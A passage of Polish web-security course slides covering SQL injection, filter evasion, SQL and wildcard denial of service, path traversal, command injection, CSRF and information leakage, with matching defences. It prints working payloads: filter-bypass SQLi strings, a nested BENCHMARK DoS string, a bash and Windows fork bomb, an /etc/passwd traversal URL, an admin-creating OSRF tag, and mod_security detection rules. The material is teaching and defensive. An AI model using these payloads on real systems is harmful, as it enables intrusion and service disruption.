+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a     '</span> t6,
+       <span style="color: #008000;">' a'</span> = <span style="color: #008000;">'a'</span>      t7,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a'</span>     t8,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a '</span>    t9;
+</pre>
+</div>
+
+<pre class="example">
++----+----+----+----+----+----+----+----+----+
+| t1 | t2 | t3 | t4 | t5 | t6 | t7 | t8 | t9 |
++----+----+----+----+----+----+----+----+----+
+|  1 |  0 |  0 |  0 |  0 |  0 |  0 |  0 |  0 |
++----+----+----+----+----+----+----+----+----+
+</pre>
+</section>
+<section id="sec-8-29" >
+
+<h3>Porównywanie łańcuchów - Oracle</h3>
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a'</span>      THEN 1 ELSE 0 END t1, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A'</span>      THEN 1 ELSE 0 END t2, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a '</span>     THEN 1 ELSE 0 END t3, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A '</span>     THEN 1 ELSE 0 END t4,
+       CASE WHEN <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a'</span>      THEN 1 ELSE 0 END t5,
+       CASE WHEN <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a     '</span> THEN 1 ELSE 0 END t6,
+       CASE WHEN <span style="color: #008000;">' a'</span> = <span style="color: #008000;">'a'</span>      THEN 1 ELSE 0 END t7,
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a'</span>     THEN 1 ELSE 0 END t8, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a '</span>    THEN 1 ELSE 0 END t9
+  FROM dual
+</pre>
+</div>
+</section>
+<section id="sec-8-30" >
+
+<h3>Porównywanie łańcuchów - Oracle - odpowiedź</h3>
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a'</span>      THEN 1 ELSE 0 END t1, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A'</span>      THEN 1 ELSE 0 END t2, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a '</span>     THEN 1 ELSE 0 END t3, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A '</span>     THEN 1 ELSE 0 END t4,
+       CASE WHEN <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a'</span>      THEN 1 ELSE 0 END t5,
+       CASE WHEN <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a     '</span> THEN 1 ELSE 0 END t6,
+       CASE WHEN <span style="color: #008000;">' a'</span> = <span style="color: #008000;">'a'</span>      THEN 1 ELSE 0 END t7,
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a'</span>     THEN 1 ELSE 0 END t8, 
+       CASE WHEN <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a '</span>    THEN 1 ELSE 0 END t9
+  FROM dual
+</pre>
+</div>
+
+<pre class="example">
++----+----+----+----+----+----+----+----+----+
+| T1 | T2 | T3 | T4 | T5 | T6 | T7 | T8 | T9 |
+|----+----+----+----+----+----+----+----+----|
+|  1 |  0 |  1 |  0 |  1 |  1 |  0 |  0 |  0 |
++----+----+----+----+----+----+----+----+----+
+</pre>
+</section>
+<section id="sec-8-31" >
+
+<h3>Omijanie filtrów</h3>
+<p>
+Często programiści piszą swoje własne, "domowe" sposoby zapobiegania
+SQLi. Dużą cześć można łatwo obejść:
+</p>
+
+<pre class="example">
+- ?id=-1/**/union/**/select/**/…
+- ?id=-1/*ab*/union/*cd*/select/*ef*/…
+- ?id=-1 union … where login = char (77,121,83,81,76)
+- ?id=-1 union … where login = concat (char(77), char(121))
+- (mysql) ?id=-1 union … where login = 0×414243
+</pre>
+</section>
+<section id="sec-8-32" >
+
+<h3>Omijanie filtrów - Apache mod_security</h3>
+<pre class="example">
+#Prevent SQL injection in cookies
+SecFilterSelective COOKIE_VALUES "((select|grant|delete|insert|drop|alter|replace|truncate|update|create|rename|describe)[[:space:]]+[A-Z|a-z|0-9|*| |,]+[[:space:]]+(from|into|table|database|index|view)[[:space:]]+[A-Z|a-z|0-9|*| |,]|UNION SELECT.*'.*'.*,[0-9].*INTO.*FROM)" "id:300011,rev:1,severity:2,msg:'Generic SQL injection in cookie'"
+
+#Prevent SQL injection in UA
+SecFilterSelective HTTP_USER_AGENT "((select|grant|delete|insert|drop|alter|replace|truncate|update|create|rename|describe)[[:space:]]+[A-Z|a-z|0-9|*| |,]+[[:space:]]+(from|into|table|database|index|view)[[:space:]]+[A-Z|a-z|0-9|*| |,]|UNION SELECT.*'.*'.*,[0-9].*INTO.*FROM)" "id:300012,rev:1,severity:2,msg:'Generic SQL injection in User Agent header'"
+
+# Generic filter to prevent SQL injection attacks
+# Understand that all SQL filters are very limited and are very difficult to prevent false postives and negatives.
+# Please report false positives/negatives to mike@gotroot.com
+SecFilter "((select|grant|delete|insert|drop|alter|replace|truncate|update|create|rename|describe)[[:space:]]+[A-Z|a-z|0-9|*| |,]+[[:space:]]+(from|into|table|database|index|view)[[:space:]]+[A-Z|a-z|0-9|*| |,]|UNION SELECT.*'.*'.*,[0-9].*INTO.*FROM)" "id:300013,rev:1,severity:2,msg:'Generic SQL injection protection'"
+</pre>
+</section>
+<section id="sec-8-33" >
+
+<h3>Zapobieganie SQLi</h3>
+<ul class="org-ul">
+<li>Używać <code>PreparedStatements</code>
+</li>
+<li>Używać <code>StoredProcedures</code>
+</li>
+<li>Escape-ować dane pochodzące od użytkownika
+</li>
+</ul>
+</section>
+<section id="sec-8-34" >
+
+<h3>Pytanie</h3>
+<p>
+Czy możemy być pewni co do odporności na SQLi gdy do komunikacji z
+bazą danych używamy:
+</p>
+
+<ul class="org-ul">
+<li>PreparedStatement
+</li>
+<li>Hibernate
+</li>
+<li>Procedur składowanych
+</li>
+</ul>
+</section>
+<section id="sec-8-35" >
+
+<h3>Odpowiedź</h3>
+<ul class="org-ul">
+<li>PreparedStatement
+</li>
+</ul>
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">String</span> <span style="color: #BA36A5;">userName</span> = request.getParameter(<span style="color: #008000;">"userName"</span>); 
+<span style="color: #6434A3;">PreparedStatement</span> <span style="color: #BA36A5;">ps</span> = connection.prepareStatement(<span style="color: #008000;">"SELECT * FROM users WHERE userName = '"</span> + userName + <span style="color: #008000;">"'"</span>);
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">String</span> <span style="color: #BA36A5;">userName</span> = request.getParameter(<span style="color: #008000;">"userName"</span>); 
+<span style="color: #6434A3;">PreparedStatement</span> <span style="color: #BA36A5;">ps</span> = connection.prepareStatement(<span style="color: #008000;">"SELECT * FROM users WHERE userName = ?"</span>);
+ps.setString(1, userName);
+</pre>
+</div>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Hibernate
+</li>
+</ul>
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">String</span> <span style="color: #BA36A5;">userName</span> = request.getParameter(<span style="color: #008000;">"userName"</span>); 
+<span style="color: #6434A3;">Query</span> <span style="color: #BA36A5;">q</span> = session.createQuery(<span style="color: #008000;">"from User u where u.userName ='"</span> +userName <span style="color: #008000;">"'"</span>);
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">String</span> <span style="color: #BA36A5;">userName</span> = request.getParameter(<span style="color: #008000;">"userName"</span>); 
+<span style="color: #6434A3;">Query</span> <span style="color: #BA36A5;">q</span> = session.createQuery(<span style="color: #008000;">"from User u where u.userName = :userName"</span>);
+q.setParameter(<span style="color: #008000;">"userName"</span>, userName);
+</pre>
+</div>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Stored procedure
+</li>
+</ul>
+<div class="org-src-container">
+
+<pre  class="src src-sql">sqlStmt := <span style="color: #008000;">'SELECT id FROM users WHERE userName = '''</span> || p_username || <span style="color: #008000;">''''</span>;
+EXECUTE IMMEDIATE sqlStmt INTO userId;
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">sqlStmt := <span style="color: #008000;">'SELECT id FROM users WHERE userName = :1'</span>;
+EXECUTE IMMEDIATE sqlStmt USING p_userName;
+</pre>
+</div>
+</section>
+<section id="sec-8-36" >
+
+<h3>SDOS (SQL Denial of Service)</h3>
+<p>
+Jeśli wstrzyknięty kod powoduje wykonanie zasobożernego zapytania,
+możemy doprowadzić do sytuacji, że baza danych będzie zbyt zajęta
+naszymi zapytaniami by przetwarzać te prawdziwe. Ponawianie zapytania
+SDOS wzmacnia działanie, chociaż czasami może wystarczyć pojedyncze
+zapytanie. SDOS może zostać przeprowadzony w oparciu o:
+</p>
+
+<ul class="org-ul">
+<li>rozbudowane zapytanie - wielokrotne połączenia dużych tabel,
+iloczyny kartezjańskie, operator IN dla dużego zbioru, podzapytania,
+zapytania hierarchiczne
+</li>
+
+<li>ataki na wildcard-y
+</li>
+
+<li>wykorzystanie funkcji diagnostycznych
+</li>
+</ul>
+<pre class="example">
+x' AND BENCHMARK(9999999,BENCHMARK(999999,BENCHMARK(999999,MD5(NOW()))))=0 OR '1'='1
+</pre>
+</section>
+<section id="sec-8-37" >
+
+<h3>SQL Wildcards attack</h3>
+<p>
+Jednym z typów SDOS jest atak na zapytania które korzystają z
+operatora <code>LIKE</code>. Często piszemy wyszukiwanie w aplikacjach w ten
+sposób:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT * FROM news WHERE title LIKE <span style="color: #008000;">'%Java%'</span>
+</pre>
+</div>
+
+<p>
+Z reguły takie zapytania wykonują się bardzo szybko, ale użycie
+odpowiednio spreparowanych parametrów może sprawić, że to samo
+zapytanie będzie wykonywać się kilkadziesiąt razy dłużej konsumując
+wszystkie dostępne zasoby.
+</p>
+</section>
+<section id="sec-8-38" >
+
+<h3>SQL Wildecards attack - przykłady</h3>
+<pre class="example">
+%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&amp;N%_)$*£()$*R"_)][%](%[x])%a][$*"£$-9]_%
+
+%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}£$&amp;N%55_)$*£()$*R"_)][%55](%66[x])%ba][$*"£$-9]_%54
+
+_[r/a)_ _(r/b)_ _(r-d)_
+
+%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
+
+%_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
+</pre>
+</section>
+<section id="sec-8-39" >
+
+<h3>SQL Wildcards attack - zapobieganie</h3>
+<ul class="org-ul">
+<li>do wyszukiwania pełnotekstowego używać indeksów (SOLR) lub baz NoSQL
+</li>
+<li>walidować parametry, ograniczyć znaki specjalne i operatory
+</li>
+<li>ograniczyć długość tekstu 
+</li>
+<li>wprowadzić timeout-y dla zapytań
+</li>
+<li>monitorować aktywność bazy danych
+</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="sec-9" >
+
+<h2>Pozostałe ataki</h2>
+</section>
+<section id="sec-9-1" >
+
+<h3>Listowanie użytkowników</h3>
+<p>
+Elementy aplikacji związane z logowaniem, odzyskiwaniem hasła, nazwy
+konta itp nie powinny ułatwiać znajdowania nazw istniejących
+użytkowników. Błędne logowanie do aplikacji powinno zwrócić komunikat:
+</p>
+
+<p>
+<b>Użytkownik lub hasło nie są prawidłowe</b>
+</p>
+
+<p>
+zamiast
+</p>
+
+<p>
+<b>Podany użytkownik nie istnieje</b>
+</p>
+</section>
+<section id="sec-9-2" >
+
+<h3>Plik robots.txt</h3>
+<p>
+Plik <code>robots.tx</code> wchodzący w skład mechanizmu <b>Robots Exclusion
+Protocol</b> może być żródłem informacji o ukrytych zasobach. Niezależnie
+od niego można sprawdzić adresy takie jak:
+</p>
+
+<ul class="org-ul">
+<li>test.przykladowa-strona.pl
+</li>
+<li>dev.przykladowa-strona.pl
+</li>
+<li>old.przykladowa-strona.pl
+</li>
+<li>new.przykladowa-strona.pl
+</li>
+<li>przykladowa-strona.pl/nowa
+</li>
+<li>Google: site:przykladowa-strona.pl
+</li>
+</ul>
+</section>
+<section id="sec-9-3" >
+
+<h3>Przykład pliku robots.txt</h3>
+<pre class="example">
+User-agent: *
+Disallow: /administrator/
+Disallow: /cache/
+Disallow: /components/
+Disallow: /images/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /libraries/
+Disallow: /media/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /templates/
+Disallow: /tmp/
+Disallow: /xmlrpc/
+Disallow: /pliki/
+</pre>
+</section>
+<section id="sec-9-4" >
+
+<h3>Ukryte zasoby (Forceful browsing)</h3>
+<p>
+Możemy być pewni że atakujący (bądź skrypt którego użyje) będzie
+szukał ukrytych, potencjalnie ciekawych zasobów jak:
+</p>
+<ul class="org-ul">
+<li><code>/logs/</code>
+</li>
+<li><code>/version</code>
+</li>
+<li><code>/phpMyAdmin</code>
+</li>
+<li><code>/probe</code>
+</li>
+<li><code>/manager/html</code>
+</li>
+<li><code>/swagger</code>
+</li>
+<li><code>/monitoring</code>
+</li>
+<li><code>/admin</code>
+</li>
+<li><code>/admin.jsp~</code>
+</li>
+<li><code>/admin.jsp.bak</code>
+</li>
+</ul>
+</section>
+<section id="sec-9-5" >
+
+<h3>Lista katalogów OWASP ZAP</h3>
+<p>
+Dostępne są gotowe listy nazw zasobów do przeszukania:
+</p>
+
+<p>
+<a href="https://github.com/zaproxy/zap-extensions/tree/master/src/org/zaproxy/zap/extension/directorylistv2_3/files/fuzzers/dirbuster">https://github.com/zaproxy/zap-extensions/tree/master/src/org/zaproxy/zap/extension/directorylistv2_3/files/fuzzers/dirbuster</a>
+</p>
+
+<p>
+największa zawiera ponad 1.2M wpisów
+</p>
+
+<pre class="example">
+index, images, download, 2006, news, crack, serial, warez, full, 12, contact, about, search, spacer, privacy, 11, logo, blog, new, 10, cgi-bin, .git, .svn, .hg, .bzr, faq, rss, home, img, default, 2005, products, sitemap, archives
+</pre>
+</section>
+<section id="sec-9-6" >
+
+<h3>Insecure Direct Object Reference</h3>
+<p>
+Przekazywanie do aplikacji identyfikatorów z bazy danych w dodatku
+połączone z niewłaściwą kontrolą dostępu może prowadzić do ujawnienia
+danych, mimo że np zabezpieczyliśmy kod przed SQLi.
+</p>
+
+<p>
+Przykłady:
+</p>
+<ul class="org-ul">
+<li><a href="http://wklej.org/id/{id}/">http://wklej.org/id/{id}/</a> - kolejne liczby
+</li>
+<li><a href="http://collabedit.com/{id">http://collabedit.com/{id</a>} - losowy ciąg znaków [a-z0-9]{5}
+</li>
+<li><a href="http://codeshare.io/{id">http://codeshare.io/{id</a>} - losowy ciąg znaków [a-zA-Z0-9]{5}
+</li>
+<li><a href="http://wstaw.org/w/3GVB/">http://wstaw.org/w/3GVB/</a> - kolejne znaki  [A-Z0-9]{4}
+</li>
+<li><a href="http://etxt.pl">http://etxt.pl</a> - kolejne znaki [a-z0-9]{3}
+</li>
+<li><a href="http://wklej.se/">http://wklej.se/</a> - kolejne liczby
+</li>
+</ul>
+</section>
+<section id="sec-9-7" >
+
+<h3>Wklej.org - przykład</h3>
+<pre class="example">
+http://wklej.org/id/{liczba}/
+</pre>
+
+<pre  class="example">
+error_reporting(E_ALL);
+define('API_KEY', 'aa7xxxxx');
+define('API_SECRET', '2adxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
+define('API_VERSION', 1);
+$SimPayLibs = 'SimPay.class.php';
+</pre>
+</section>
+<section id="sec-9-8" >
+
+<h3>Brak walidacji danych</h3>
+<dl class="org-dl">
+<dt><b>Średnia ocena</b></dt><dd>Serwis daje użytkownikom możliwość głosowania na
+dany produkt/artystę itp. Oceny są od 1-5,
+wybierane jako wartości z combobox-a; na podstawie
+ocen liczona jest średnia i ranking. 
+</dd>
+
+<dt><b>Ukryte pola</b></dt><dd>Użytkownik aplikacji nie ma prawa do modyfikowania
+pewnych pól, jednakże implementacja formularza
+zakłada wysyłanie ich do użytkownika jako pola ukryte
+</dd>
+</dl>
+</section>
+<section id="sec-9-9" >
+
+<h3>Path Traversal</h3>
+<p>
+Prosty atak pozwalający na dostęp do treści, których właściciel raczej
+nie miał ochoty nam udostępnić
+</p>
+
+<pre class="example">
+www.example.com/showPage.php?p=1.html
+</pre>
+
+<p>
+Łatwo można wyjść do dowolnego miejsca:
+</p>
+<pre class="example">
+www.example.com/showPage.php?p=../../../../../../../../etc/passwd
+</pre>
+</section>
+<section id="sec-9-10" >
+
+<h3>OS command injection</h3>
+<p>
+Kolejny prosty atak, który wykorzystuje lukę spowodowaną przez fakt
+uruchamiania komend systemowych wraz z parametrami przekazanymi wraz z
+requestem.
+</p>
+
+<p>
+Jak dodawać swoje komendy?
+</p>
+<ul class="org-ul">
+<li>nowa linia (<code>%0A</code>)
+</li>
+<li><code>;</code>
+</li>
+<li><code>&amp;&amp;</code>
+</li>
+<li><code>|</code>
+</li>
+</ul>
+</section>
+<section id="sec-9-11" >
+
+<h3>Fork bomb</h3>
+<p>
+Atak typu DoS który można wykonać w ramach <b>OS command
+injection</b>. Polega on na uruchomieniu kodu, którego jedynym zadaniem
+jest tworzenie kopii samego siebie.
+</p>
+
+<ul class="org-ul">
+<li>Windows
+</li>
+</ul>
+<pre class="example">
+%0|%0
+</pre>
+
+<ul class="org-ul">
+<li>Bash
+</li>
+</ul>
+<pre class="example">
+:(){ :|:&amp; };:
+</pre>
+</section>
+<section id="sec-9-12" >
+
+<h3>Cross Site Request Forgery</h3>
+<p>
+<b>CSRF</b> (CSRF, XSRF, session riding, one-click attack) to atak w którym
+atakujący wymusza w przeglądarce wykonanie request-ów w kontekście
+innego użytkownika. W ataku tym nie chodzi o ty by zmieniać treści
+stron, lecz by wykorzystać uprawnienia użytkowników zalogowanych do
+atakowanej aplikacji. Najczęściej polega on na podrzuceniu
+spreparowanych linków lub wstrzyknięcie ich do innych serwisów.
+</p>
+
+<p>
+Przykładowe cele ataków:
+</p>
+<ul class="org-ul">
+<li>zmiana danych kontaktowych, hasła itp
+</li>
+<li>zamknięcie konta
+</li>
+<li>opublikowanie artykułu na forum
+</li>
+</ul>
+</section>
+<section id="sec-9-13" >
+
+<h3>CSRF - przyczyna</h3>
+<p>
+<b>Cookies</b>
+</p>
+
+<p>
+(jako jedyna metoda autentykacji użytkownika)
+</p>
+</section>
+<section id="sec-9-14" >
+
+<h3>CSRF - scenariusz</h3>
+<img src="./images/generated-csrf-scenario.png" alt="generated-csrf-scenario.png" align="center" height="500px" />
+</section>
+<section id="sec-9-15" >
+
+<h3>CSRF - zapobieganie</h3>
+<ul class="org-ul">
+<li>Sprawdzone metody
+<ul class="org-ul">
+<li>Krótkie czasy sesji dla ważnych zasobów
+</li>
+<li>Dodatkowa prośba o zalogowanie przed wykonaniem ważnej operacji,
+przejściem do trybu administracyjnego itp.
+</li>
+<li>CSRF token - generując formularz można dodać do niego ukryte pole
+zawierające losowy tekst lub liczbę, która zostanie potem
+zweryfikowana z wartością przechowywaną w sesji po stronie serwera
+</li>
+<li>Wartość weryfikującą można też wpisać w ciasteczku, które w myśl
+"same origin policy" nie jest dostępne dla skryptów z innych
+strony
+</li>
+</ul>
+</li>
+</ul>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Mity i półśrodki (co najwyżej utrudniają atak niż mu zapobiegają)
+<ul class="org-ul">
+<li>Użycie metod innych niż <code>GET</code>
+</li>
+<li>Sprawdzanie nagłówka <code>Referer</code>
+</li>
+<li>Używanie nagłówków HTTP specyficznych dla aplikacji
+</li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="sec-9-16" >
+
+<h3>On Site Request Forgery (OSRF)</h3>
+<p>
+Technika bardzo podobna do CSRF z tym że kod zmuszający przeglądarkę
+do wykonania nieautoryzowanej akcji zostaje umieszczony wewnątrz
+podatnego systemu.
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-html">&lt;<span style="color: #006699;">img</span> <span style="color: #BA36A5;">src</span>=<span style="color: #008000;">"http://www.example.com/admin/addUser.php?u=admin2&amp;p=pass"</span> /&gt;
+</pre>
+</div>
+</section>
+<section id="sec-9-17" >
+
+<h3>&#x2026; Injection</h3>
+<p>
+Rodzina ataków Injection jest bardzo liczna:
+</p>
+<ul class="org-ul">
+<li>HTTP Header Injection
+</li>
+<li>CSS Injection
+</li>
+<li>Ldap Injection
+</li>
+<li>XPath Injection
+</li>
+<li>HQL Injection
+</li>
+<li>SMTP Injection
+</li>
+<li>CSS Injection
+</li>
+<li>CQL Injection
+</li>
+<li>itd itp
+</li>
+</ul>
+
+<p>
+Można założyć że jeśli aplikacja używa danych wprost od użytkownika w
+jakimkolwiek języku interpretowanym czy skrypcie to będzie podatna na
+atak typu <b>Injection</b>.
+</p>
+</section>
+<section id="sec-9-18" >
+
+<h3>Ataki słownikowe</h3>
+<p>
+W internecie dostępne są słowniki które mogę znacząco poprawić
+skuteczność ataków brute-force:
+</p>
+<ul class="org-ul">
+<li>wszystkie wyrazy danego języka
+</li>
+<li>typowe hasła
+</li>
+<li>hasła które wyciekły z innych serwisów - użytkownicy często używają
+tego samego hasła w wielu miejscach
+</li>
+</ul>
+</section>
+<section id="sec-9-19" >
+
+<h3>Obrona przed atakami słownikowymi</h3>
+<dl class="org-dl">
+<dt><b>Opóźnienie</b></dt><dd>Dodanie nawet krótkiego opóźnienia podczas błędnego
+logowania znacząco redukuje skuteczność metod
+słownikowych
+</dd>
+
+<dt><b>Odpowiednie komunikaty</b></dt><dd>Elementy aplikacji związane z logowaniem,
+odzyskiwaniem hasła, nazwy konta itp nie powinny ułatwiać
+znajdowania nazw istniejących użytkowników. Błędne logowanie do
+aplikacji powinno zwrócić komunikat: <b>Użytkownik lub hasło nie są
+prawidłowe</b> zamiast <b>Podany użytkownik nie istnieje</b>
+</dd>
+</dl>
+
+</section>
+<section>
+
+<dl class="org-dl">
+<dt><b>Tymczasowe blokowanie konta</b></dt><dd>Zablokowanie konta (także tymczasowe)
+po określonej ilości nieudanych prób w jednostce czasu
+</dd>
+
+<dt><b>Logowanie i blokowanie adresów</b></dt><dd>Jeśli dany adres IP wysyła zbyt
+dużo nieudanych prób logowania może to być sygnał, że ktoś
+skanuje z niego naszą aplikację
+</dd>
+
+<dt><b>Captcha</b></dt><dd>Bardzo dobre zabezpieczenie przed atakami słownikowymi na
+hasło użytkownika, jednakże może prowadzić do ułatwienia
+znalezienia istniejących użytkowników
+</dd>
+</dl>
+</section>
+<section id="sec-9-20" >
+
+<h3>Odpowiedzi serwera</h3>
+<p>
+Przeglądając nagłówki HTTP jaki i sekcję META w standardowej
+odpowiedzi serwera:
+</p>
+
+<pre class="example">
+curl -v www.foobar.com
+wget --server-response www.foobar.com
+</pre>
+
+<p>
+Można bez wysiłku dostać informacje:
+</p>
+
+<pre class="example">
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze15
+
+Server: Microsoft-IIS/8.5
+X-AspNet-Version: 4.0.30319
+MicrosoftSharePointTeamServices: 16.0.0.5312
+</pre>
+
+<p>
+czy też:
+</p>
+<pre class="example">
+&lt;meta name="generator" content="Joomla! 1.5 - Open Source Content Management" /&gt;
+&lt;meta name="generator" content="Incomedia WebSite X5 Professional 12.0.7.26 - www.websitex5.com" /&gt;
+&lt;meta name="generator" content="WordPress 4.5.2"/&gt;
+</pre>
+</section>
+<section id="sec-9-21" >
+
+<h3>Strony błędów</h3>
+<ul class="org-ul">
+<li>Default-owe strony błędów z reguły pokazują dużo informacji
+przydatnych dla programisty
+</li>
+<li>Domyślna strony błędów może być świetnym źródłem informacji o naszej
+aplikacji, użytych technologiach, wersji serwera, błędach przy
+walidacji danych a czasami nawet haseł do baz danych(!!!)
+</li>
+<li>Bardzo często spotkamy tam stacktrace albo kawałek źródła (php, asp,
+jsp) który spowodował wystąpienie błędu
+</li>
+<li>Pozostawienie domyślnych stron błędów jest bardzo niebezpieczne
+</li>
+<li>Strona błędu która wyświetla ładny komunikat ale w komentarzu HTML
+przechowuje dane o błędzie, nie jest rozwiązaniem problemu
+</li>
+<li>Stałe frazy z komunikatów błędów mogą zostać użyte jako zapytania w
+Google hackingu
+</li>
+</ul>
+</section>
+<section id="sec-9-22" >
+
+<h3>Komunikaty o błędach - PHP</h3>
+<pre class="example">
+Warning: mysql_connect() [function.mysql-connect]: Access denied for user
+'xxxxx'@'localhost' (using password: YES) in 
+/home/users/xxxxx/public_html/xxxxx.com.pl/inc/mysql_connect.php on line 2
+
+Nie mozna polaczyc z serwerem mysql!
+</pre>
+
+<pre class="example">
+Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[HY000]
+[2003] Can't connect to MySQL server on 'xxx.pl' (113)' in
+/home/users/xxx/private_html/framework/Db/PDO.php:39 Stack trace: #0
+/home/users/xxx/private_html/framework/Db/PDO.php(39): 
+PDO-&gt;__construct('mysql:host=xxx', 'admin_xxx', 'xyz123') #1
+/home/users/xxx/private_html/framework/Controller/Application.php(65): 
+Db_PDO-&gt;__construct() #2 
+/home/users/xxx/private_html/xxx/Controller/Base.php(61):
+Controller_Application-&gt;__construct(Object(Controller_Front)) #3
+/home/users/xxx/private_html/framework/Controller/Front.php(93):
+Controller_Base-&gt;__construct(Object(Controller_Front)) #4
+/home/users/xxx/public_html/xxx/index.php(61): Controller_Front-&gt;run() #5
+{main} thrown in /home/users/xxx/private_html/framework/Db/PDO.php on line 39
+</pre>
+</section>
+<section id="sec-9-23" >
+
+<h3>Strona o bezpieczeństwie webaplikacji</h3>
+<p>
+Jedna ze stron poświęconych bezpieczeństwu webaplikacji zaprezentowała to:
+</p>
+
+<pre class="example">
+Warning: Table './xxxxx/sessions' is marked as crashed and should be repaired query: SELECT u.*, s.* FROM users u INNER JOIN sessions s ON u.uid = s.uid WHERE s.sid = '4f21e1xxxxxxxxxxxxxxxxxxxxxxxxxx' in /home/xxxxx/public_html/includes/database.mysqli.inc on line 1xx
+
+Warning: session_start(): Cannot send session cache limiter - headers already sent (output started at /home/xxxxx/public_html/includes/database.mysqli.inc:134) in /home/xxxxx/public_html/includes/bootstrap.inc on line 1xxx
+
+Warning: Cannot modify header information - headers already sent by (output started at /home/xxxxx/public_html/includes/database.mysqli.inc:1xx) in /home/xxxxx/public_html/sites/all/libraries/bad-behavior/bad-behavior/screener.inc.php on line xxx
+</pre>
+</section>
+<section id="sec-9-24" >
+
+<h3>Strona błędu - Tomcat</h3>
+<pre class="example">
+HTTP Status 500 - An exception occurred processing JSP page /xxx.jsp 
+  at line 50
+
+type Exception report
+
+message An exception occurred processing JSP page /xxx.jsp at line 50
+
+description The server encountered an internal error that prevented it from 
+  fulfilling this request.
+
+exception
+
+org.apache.jasper.JasperException: An exception occurred processing JSP
+  page /xxx.jsp at line 50
+
+47:  &lt;div class="a"&gt;
+48:  &lt;div class="b"&gt;c&lt;/div&gt;
+49:  &lt;div class="d"&gt;
+50:    &lt;a href="&lt;%=path %&gt;/e.view?id=&lt;%=x.getId() %&gt;"&gt;x&lt;/a&gt;&amp;nbsp;|&amp;nbsp;
+51:    &lt;a href="&lt;%=path %&gt;/e.view?id=1&amp;xyzId=&lt;%=x.getId() %&gt;"&gt;zz1&lt;/a&gt; |
+52:    &lt;a href="&lt;%=path %&gt;/e.view?id=2&amp;xyzId=&lt;%=x.getId() %&gt;"&gt;zz2&lt;/a&gt; |
+53:    &lt;a href="&lt;%=path %&gt;/e.view?id=3&amp;xyzId=&lt;%=x.getId() %&gt;"&gt;zz3&lt;/a&gt; |
+</pre>
+</section>
+<section id="sec-9-25" >
+
+<h3>Wymuszenie błędów na serwerze</h3>
+<ul class="org-ul">
+<li><code>400 Bad Request</code>
+</li>
+</ul>
+<pre class="example">
+curl -ivs --raw -X POST -H "Content-Length: x" http://www.server.com
+</pre>
+
+<ul class="org-ul">
+<li><code>404 Not Found</code>
+</li>
+</ul>
+<pre class="example">
+curl -ivs --raw http://www.server.com/thisPageDoesntExist
+</pre>
+
+<ul class="org-ul">
+<li><code>403 Forbidden (405 Method Not Allowed)</code>
+</li>
+</ul>
+
+<pre class="example">
+curl -ivs --raw -X DELETE http://www.server.com/someResource
+</pre>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li><code>408 Request Timeout</code>
+</li>
+</ul>
+<pre class="example">
+telnet www.server.com 80
+GET / HTTP/1.1
+(wait some time)
+</pre>
+
+<ul class="org-ul">
+<li><code>500 Internal Server Error</code>
+</li>
+</ul>
+<pre class="example">
+curl -ivs --raw -X GET http://www.server.com?q=something&amp;page=nonNumber
+</pre>
+
+<pre class="example">
+curl  -ivs --raw http://www.server.com/%
+</pre>
+</section>
+<section id="sec-9-26" >
+
+<h3>Biblioteki Access Control</h3>
+<dl class="org-dl">
+<dt><b>Spring Security (<a href="http://projects.spring.io/spring-security/">http://projects.spring.io/spring-security/</a>)</b></dt><dd>authentication,
+authorization, security mechanisms (SF, CJ, CSRF etc.), OAUTH
+</dd>
+
+<dt><b>Apache Shiro (<a href="http://shiro.apache.org/">http://shiro.apache.org/</a>)</b></dt><dd>authentication,
+authorization, cryptography, session management
+</dd>
+
+<dt><b>jGuard (<a href="http://jguard.xwiki.com/">http://jguard.xwiki.com/</a>)</b></dt><dd>authorization, authentication,
+based on JAAS
